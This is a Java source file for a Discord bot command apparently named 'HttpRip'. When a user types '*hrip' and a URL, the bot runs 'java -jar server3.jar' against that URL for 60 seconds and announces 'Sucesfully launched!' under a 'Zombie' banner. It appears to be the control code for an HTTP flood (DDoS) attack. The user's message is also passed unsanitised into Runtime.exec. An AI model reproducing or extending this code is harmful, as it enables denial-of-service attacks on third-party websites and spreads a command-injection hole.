package ua.DNZombie.ZCommands.Main;

import java.awt.Color;
import java.io.IOException;

import net.dv8tion.jda.api.EmbedBuilder;
import net.dv8tion.jda.api.entities.Message;
import net.dv8tion.jda.api.entities.MessageChannel;
import net.dv8tion.jda.api.entities.MessageEmbed;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;

public class HttpRipLaunch extends ListenerAdapter
{
    @Override
    public void onMessageReceived(final MessageReceivedEvent event) {
    	final MessageChannel channel = event.getChannel();
        final Message msg = event.getMessage();
        String mesag = msg.getContentDisplay();
        final EmbedBuilder eb = new EmbedBuilder();
        if (msg.getContentRaw().contains("*hrip ")) {
        	if(msg.getChannel() != null) {
        		mesag = mesag.replace("*hrip ", "");
                eb.setTitle("☠ Zombie answer ☠");
                eb.addField("HttpRip", "\n Sucesfully launched! \n Target URL: " + "`" + mesag + "`" + "\n Time: `60s`", false);
                eb.setColor(Color.RED);
                channel.sendMessageEmbeds(eb.build(), new MessageEmbed[0]).queue();
                
                try {
                    Runtime.getRuntime().exec("java -jar server3.jar " + mesag + " 10 5 60");
                } catch (IOException e) {
                	System.out.println("HttpRip launch error!");
                }
        	}
        }
    }
}